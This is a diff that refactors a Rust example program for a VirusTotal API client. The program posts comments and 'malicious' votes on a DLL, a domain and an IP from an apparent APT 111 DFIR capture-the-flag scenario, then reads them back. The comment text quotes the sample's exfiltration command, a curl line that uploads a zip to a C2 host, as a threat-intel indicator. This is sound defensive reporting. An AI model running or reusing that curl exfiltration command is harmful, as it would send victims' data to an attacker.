@@ -1,6 +1,6 @@
 use std::env;
 use tokio::time::{sleep, Duration, Instant};
-use virustotal_rs::{ApiTier, ClientBuilder, VoteVerdict};
+use virustotal_rs::{ApiTier, Client, ClientBuilder, VoteVerdict};
 
 /// Helper to enforce public API rate limit (4 requests per minute)
 struct RateLimiter {
@@ -57,6 +57,171 @@ impl RateLimiter {
     }
 }
 
+/// Helper struct to encapsulate comment/vote operations
+struct ResourceOperations<'a> {
+    client: &'a Client,
+    rate_limiter: &'a mut RateLimiter,
+}
+
+impl<'a> ResourceOperations<'a> {
+    fn new(client: &'a Client, rate_limiter: &'a mut RateLimiter) -> Self {
+        Self {
+            client,
+            rate_limiter,
+        }
+    }
+
+    /// Generic function to add a comment to any resource type
+    async fn add_comment(
+        &mut self,
+        resource_name: &str,
+        comment: &str,
+        hash_or_id: &str,
+        resource_type: &str,
+    ) {
+        println!("\n📝 Adding comment to {}...", resource_name);
+        self.rate_limiter.wait_if_needed().await;
+
+        let result = match resource_type {
+            "file" => self.client.files().add_comment(hash_or_id, comment).await,
+            "domain" => self.client.domains().add_comment(hash_or_id, comment).await,
+            "ip" => {
+                self.client
+                    .ip_addresses()
+                    .add_comment(hash_or_id, comment)
+                    .await
+            }
+            _ => return,
+        };
+
+        match result {
+            Ok(comment) => {
+                println!("  ✅ Comment added successfully!");
+                println!("  Comment ID: {}", comment.object.id);
+            }
+            Err(e) => {
+                println!("  ⚠️  Could not add comment: {}", e);
+            }
+        }
+    }
+
+    /// Generic function to add a vote to any resource type
+    async fn add_vote(&mut self, resource_name: &str, hash_or_id: &str, resource_type: &str) {
+        println!("\n🗳️ Voting on {} as malicious...", resource_name);
+        self.rate_limiter.wait_if_needed().await;
+
+        let result = match resource_type {
+            "file" => {
+                self.client
+                    .files()
+                    .add_vote(hash_or_id, VoteVerdict::Malicious)
+                    .await
+            }
+            "domain" => {
+                self.client
+                    .domains()
+                    .add_vote(hash_or_id, VoteVerdict::Malicious)
+                    .await
+            }
+            "ip" => {
+                self.client
+                    .ip_addresses()
+                    .add_vote(hash_or_id, VoteVerdict::Malicious)
+                    .await
+            }
+            _ => return,
+        };
+
+        match result {
+            Ok(vote) => {
+                println!("  ✅ Vote added successfully!");
+                println!("  Vote verdict: {:?}", vote.object.attributes.verdict);
+            }
+            Err(e) => {
+                println!("  ⚠️  Could not add vote: {}", e);
+            }
+        }
+    }
+
+    /// Generic function to check comments for any resource type
+    async fn check_comments(&mut self, resource_name: &str, hash_or_id: &str, resource_type: &str) {
+        println!("\n🔍 Checking {} comments...", resource_name);
+        self.rate_limiter.wait_if_needed().await;
+
+        let result = match resource_type {
+            "file" => {
+                self.client
+                    .files()
+                    .get_comments_with_limit(hash_or_id, 5)
+                    .await
+            }
+            "domain" => {
+                self.client
+                    .domains()
+                    .get_comments_with_limit(hash_or_id, 5)
+                    .await
+            }
+            "ip" => {
+                self.client
+                    .ip_addresses()
+                    .get_comments_with_limit(hash_or_id, 5)
+                    .await
+            }
+            _ => return,
+        };
+
+        match result {
+            Ok(comments) => {
+                println!("  Found {} comment(s):", comments.data.len());
+                for (i, comment) in comments.data.iter().enumerate().take(3) {
+                    let preview = if comment.object.attributes.text.len() > 100 {
+                        format!("{}...", &comment.object.attributes.text[..100])
+                    } else {
+                        comment.object.attributes.text.clone()
+                    };
+                    println!("    {}. {}", i + 1, preview);
+                }
+            }
+            Err(e) => println!("  Error: {}", e),
+        }
+    }
+
+    /// Generic function to check votes for any resource type
+    async fn check_votes(&mut self, resource_name: &str, hash_or_id: &str, resource_type: &str) {
+        println!("\n🔍 Checking {} votes...", resource_name);
+        self.rate_limiter.wait_if_needed().await;
+
+        let result = match resource_type {
+            "file" => self.client.files().get_votes(hash_or_id).await,
+            "domain" => self.client.domains().get_votes(hash_or_id).await,
+            "ip" => self.client.ip_addresses().get_votes(hash_or_id).await,
+            _ => return,
+        };
+
+        match result {
+            Ok(votes) => {
+                let malicious = votes
+                    .data
+                    .iter()
+                    .filter(|v| v.object.attributes.verdict == VoteVerdict::Malicious)
+                    .count();
+                let harmless = votes
+                    .data
+                    .iter()
+                    .filter(|v| v.object.attributes.verdict == VoteVerdict::Harmless)
+                    .count();
+                println!(
+                    "  Total votes: {} (Malicious: {}, Harmless: {})",
+                    votes.data.len(),
+                    malicious,
+                    harmless
+                );
+            }
+            Err(e) => println!("  Error getting votes: {}", e),
+        }
+    }
+}
+
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Get API key from environment variable
@@ -78,6 +243,97 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Create rate limiter
     let mut rate_limiter = RateLimiter::new();
 
+    // Print header information
+    print_header();
+
+    // Create operations helper
+    let mut ops = ResourceOperations::new(&client, &mut rate_limiter);
+
+    println!("\n{}", "=".repeat(60));
+    println!("💬 PHASE 1: ADDING COMMENTS");
+    println!("{}", "=".repeat(60));
+
+    // Add comments to all resources
+    println!("[1/3]");
+    ops.add_comment(
+        "7z.dll",
+        "APT 111 malware sample from DFIR CTF. DLL side-loading technique using legitimate 7z.dll name. \
+         Collects system info (ipconfig, netstat, tasklist, net commands) via system() calls. \
+         Archives data with zip.exe and exfiltrates to https://office.msftupdated.com using curl. \
+         Strings show: 'curl.exe -F file=@1.zip https://office.msftupdater.com' \
+         #CTF #APT111 #DLLSideLoading #DFIR",
+        dll_hash,
+        "file",
+    )
+    .await;
+
+    println!("[2/3]");
+    ops.add_comment(
+        "domain",
+        "APT 111 C2 domain from DFIR CTF. Receives exfiltrated system info from DLL side-loading malware. \
+         The malware uses curl to POST zip archives here. Hosted on Google Cloud IP 35.208.137.212. \
+         Part of a simulated threat scenario for CTF training. #CTF #APT111 #C2 #DFIR",
+        domain,
+        "domain",
+    )
+    .await;
+
+    println!("[3/3]");
+    ops.add_comment(
+        "IP address",
+        "APT 111 C2 server from DFIR CTF. Google Cloud IP hosting the malicious domain office.msftupdated.com. \
+         Receives exfiltrated data from DLL side-loading attack via HTTPS POST. \
+         This is a CTF training scenario - not a real threat. #CTF #APT111 #DFIR",
+        ip,
+        "ip",
+    )
+    .await;
+
+    println!("\n{}", "=".repeat(60));
+    println!("🗳️ PHASE 2: ADDING VOTES");
+    println!("{}", "=".repeat(60));
+
+    // Add votes to all resources
+    println!("[1/3]");
+    ops.add_vote("7z.dll", dll_hash, "file").await;
+
+    println!("[2/3]");
+    ops.add_vote("domain", domain, "domain").await;
+
+    println!("[3/3]");
+    ops.add_vote("IP", ip, "ip").await;
+
+    println!("\n{}", "=".repeat(60));
+    println!("📊 PHASE 3: VERIFYING COMMENTS & VOTES");
+    println!("{}", "=".repeat(60));
+
+    // Check comments and votes for all resources
+    println!("[1/6]");
+    ops.check_comments("7z.dll", dll_hash, "file").await;
+
+    println!("[2/6]");
+    ops.check_votes("7z.dll", dll_hash, "file").await;
+
+    println!("[3/6]");
+    ops.check_comments("domain", domain, "domain").await;
+
+    println!("[4/6]");
+    ops.check_votes("domain", domain, "domain").await;
+
+    println!("[5/6]");
+    ops.check_comments("IP", ip, "ip").await;
+
+    println!("[6/6]");
+    ops.check_votes("IP", ip, "ip").await;
+
+    // Print summary
+    print_summary();
+
+    Ok(())
+}
+
+/// Print header information
+fn print_header() {
     println!("\n{}", "=".repeat(60));
     println!("🎯 CTF CONTEXT: APT 111 - DFIR Challenge");
     println!("{}", "=".repeat(60));
@@ -89,252 +345,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("\n⚠️  Using PUBLIC API tier rate limiting:");
     println!("• Max 4 requests per minute");
     println!("• Automatic pacing enabled (15 seconds between requests)");
+}
 
-    println!("\n{}", "=".repeat(60));
-    println!("💬 PHASE 1: ADDING COMMENTS");
-    println!("{}", "=".repeat(60));
-
-    // Add comment to the DLL file
-    println!("\n📝 [1/3] Adding comment to 7z.dll...");
-    rate_limiter.wait_if_needed().await;
-    match client.files().add_comment(
-        dll_hash,
-        "APT 111 malware sample from DFIR CTF. DLL side-loading technique using legitimate 7z.dll name. \
-         Collects system info (ipconfig, netstat, tasklist, net commands) via system() calls. \
-         Archives data with zip.exe and exfiltrates to https://office.msftupdated.com using curl. \
-         Strings show: 'curl.exe -F file=@1.zip https://office.msftupdater.com' \
-         #CTF #APT111 #DLLSideLoading #DFIR"
-    ).await {
-        Ok(comment) => {
-            println!("  ✅ Comment added successfully!");
-            println!("  Comment ID: {}", comment.object.id);
-        },
-        Err(e) => {
-            println!("  ⚠️  Could not add comment: {}", e);
-        }
-    }
-
-    // Add comment to the domain
-    println!("\n📝 [2/3] Adding comment to domain...");
-    rate_limiter.wait_if_needed().await;
-    match client.domains().add_comment(
-        domain,
-        "APT 111 C2 domain from DFIR CTF. Receives exfiltrated system info from DLL side-loading malware. \
-         The malware uses curl to POST zip archives here. Hosted on Google Cloud IP 35.208.137.212. \
-         Part of a simulated threat scenario for CTF training. #CTF #APT111 #C2 #DFIR"
-    ).await {
-        Ok(comment) => {
-            println!("  ✅ Comment added successfully!");
-            println!("  Comment ID: {}", comment.object.id);
-        },
-        Err(e) => {
-            println!("  ⚠️  Could not add comment: {}", e);
-        }
-    }
-
-    // Add comment to the IP
-    println!("\n📝 [3/3] Adding comment to IP address...");
-    rate_limiter.wait_if_needed().await;
-    match client.ip_addresses().add_comment(
-        ip,
-        "APT 111 C2 server from DFIR CTF. Google Cloud IP hosting the malicious domain office.msftupdated.com. \
-         Receives exfiltrated data from DLL side-loading attack via HTTPS POST. \
-         This is a CTF training scenario - not a real threat. #CTF #APT111 #DFIR"
-    ).await {
-        Ok(comment) => {
-            println!("  ✅ Comment added successfully!");
-            println!("  Comment ID: {}", comment.object.id);
-        },
-        Err(e) => {
-            println!("  ⚠️  Could not add comment: {}", e);
-        }
-    }
-
-    println!("\n{}", "=".repeat(60));
-    println!("🗳️ PHASE 2: ADDING VOTES");
-    println!("{}", "=".repeat(60));
-
-    // Add vote to the DLL file
-    println!("\n🗳️ [1/3] Voting on 7z.dll as malicious...");
-    rate_limiter.wait_if_needed().await;
-    match client
-        .files()
-        .add_vote(dll_hash, VoteVerdict::Malicious)
-        .await
-    {
-        Ok(vote) => {
-            println!("  ✅ Vote added successfully!");
-            println!("  Vote verdict: {:?}", vote.object.attributes.verdict);
-        }
-        Err(e) => {
-            println!("  ⚠️  Could not add vote: {}", e);
-        }
-    }
-
-    // Add vote to the domain
-    println!("\n🗳️ [2/3] Voting on domain as malicious...");
-    rate_limiter.wait_if_needed().await;
-    match client
-        .domains()
-        .add_vote(domain, VoteVerdict::Malicious)
-        .await
-    {
-        Ok(vote) => {
-            println!("  ✅ Vote added successfully!");
-            println!("  Vote verdict: {:?}", vote.object.attributes.verdict);
-        }
-        Err(e) => {
-            println!("  ⚠️  Could not add vote: {}", e);
-        }
-    }
-
-    // Add vote to the IP
-    println!("\n🗳️ [3/3] Voting on IP as malicious...");
-    rate_limiter.wait_if_needed().await;
-    match client
-        .ip_addresses()
-        .add_vote(ip, VoteVerdict::Malicious)
-        .await
-    {
-        Ok(vote) => {
-            println!("  ✅ Vote added successfully!");
-            println!("  Vote verdict: {:?}", vote.object.attributes.verdict);
-        }
-        Err(e) => {
-            println!("  ⚠️  Could not add vote: {}", e);
-        }
-    }
-
-    println!("\n{}", "=".repeat(60));
-    println!("📊 PHASE 3: VERIFYING COMMENTS & VOTES");
-    println!("{}", "=".repeat(60));
-
-    // Check file comments and votes
-    println!("\n🔍 [1/6] Checking 7z.dll comments...");
-    rate_limiter.wait_if_needed().await;
-    match client.files().get_comments_with_limit(dll_hash, 5).await {
-        Ok(comments) => {
-            println!("  Found {} comment(s):", comments.data.len());
-            for (i, comment) in comments.data.iter().enumerate().take(3) {
-                let preview = if comment.object.attributes.text.len() > 100 {
-                    format!("{}...", &comment.object.attributes.text[..100])
-                } else {
-                    comment.object.attributes.text.clone()
-                };
-                println!("    {}. {}", i + 1, preview);
-            }
-        }
-        Err(e) => println!("  Error: {}", e),
-    }
-
-    println!("\n🔍 [2/6] Checking 7z.dll votes...");
-    rate_limiter.wait_if_needed().await;
-    match client.files().get_votes(dll_hash).await {
-        Ok(votes) => {
-            let malicious = votes
-                .data
-                .iter()
-                .filter(|v| v.object.attributes.verdict == VoteVerdict::Malicious)
-                .count();
-            let harmless = votes
-                .data
-                .iter()
-                .filter(|v| v.object.attributes.verdict == VoteVerdict::Harmless)
-                .count();
-            println!(
-                "  Total votes: {} (Malicious: {}, Harmless: {})",
-                votes.data.len(),
-                malicious,
-                harmless
-            );
-        }
-        Err(e) => println!("  Error getting votes: {}", e),
-    }
-
-    // Check domain comments and votes
-    println!("\n🔍 [3/6] Checking domain comments...");
-    rate_limiter.wait_if_needed().await;
-    match client.domains().get_comments_with_limit(domain, 5).await {
-        Ok(comments) => {
-            println!("  Found {} comment(s):", comments.data.len());
-            for (i, comment) in comments.data.iter().enumerate().take(3) {
-                let preview = if comment.object.attributes.text.len() > 100 {
-                    format!("{}...", &comment.object.attributes.text[..100])
-                } else {
-                    comment.object.attributes.text.clone()
-                };
-                println!("    {}. {}", i + 1, preview);
-            }
-        }
-        Err(e) => println!("  Error: {}", e),
-    }
-
-    println!("\n🔍 [4/6] Checking domain votes...");
-    rate_limiter.wait_if_needed().await;
-    match client.domains().get_votes(domain).await {
-        Ok(votes) => {
-            let malicious = votes
-                .data
-                .iter()
-                .filter(|v| v.object.attributes.verdict == VoteVerdict::Malicious)
-                .count();
-            let harmless = votes
-                .data
-                .iter()
-                .filter(|v| v.object.attributes.verdict == VoteVerdict::Harmless)
-                .count();
-            println!(
-                "  Total votes: {} (Malicious: {}, Harmless: {})",
-                votes.data.len(),
-                malicious,
-                harmless
-            );
-        }
-        Err(e) => println!("  Error getting votes: {}", e),
-    }
-
-    // Check IP comments and votes
-    println!("\n🔍 [5/6] Checking IP comments...");
-    rate_limiter.wait_if_needed().await;
-    match client.ip_addresses().get_comments_with_limit(ip, 5).await {
-        Ok(comments) => {
-            println!("  Found {} comment(s):", comments.data.len());
-            for (i, comment) in comments.data.iter().enumerate().take(3) {
-                let preview = if comment.object.attributes.text.len() > 100 {
-                    format!("{}...", &comment.object.attributes.text[..100])
-                } else {
-                    comment.object.attributes.text.clone()
-                };
-                println!("    {}. {}", i + 1, preview);
-            }
-        }
-        Err(e) => println!("  Error: {}", e),
-    }
-
-    println!("\n🔍 [6/6] Checking IP votes...");
-    rate_limiter.wait_if_needed().await;
-    match client.ip_addresses().get_votes(ip).await {
-        Ok(votes) => {
-            let malicious = votes
-                .data
-                .iter()
-                .filter(|v| v.object.attributes.verdict == VoteVerdict::Malicious)
-                .count();
-            let harmless = votes
-                .data
-                .iter()
-                .filter(|v| v.object.attributes.verdict == VoteVerdict::Harmless)
-                .count();
-            println!(
-                "  Total votes: {} (Malicious: {}, Harmless: {})",
-                votes.data.len(),
-                malicious,
-                harmless
-            );
-        }
-        Err(e) => println!("  Error getting votes: {}", e),
-    }
-
+/// Print summary information
+fn print_summary() {
     println!("\n{}", "=".repeat(60));
     println!("✅ CTF THREAT INTELLIGENCE OPERATION COMPLETE!");
     println!("{}", "=".repeat(60));
@@ -347,6 +361,4 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("  • Total API calls: 12");
     println!("  • Time elapsed: ~3 minutes");
     println!("  • Rate: 4 requests/minute (PUBLIC tier)");
-
-    Ok(())
 }
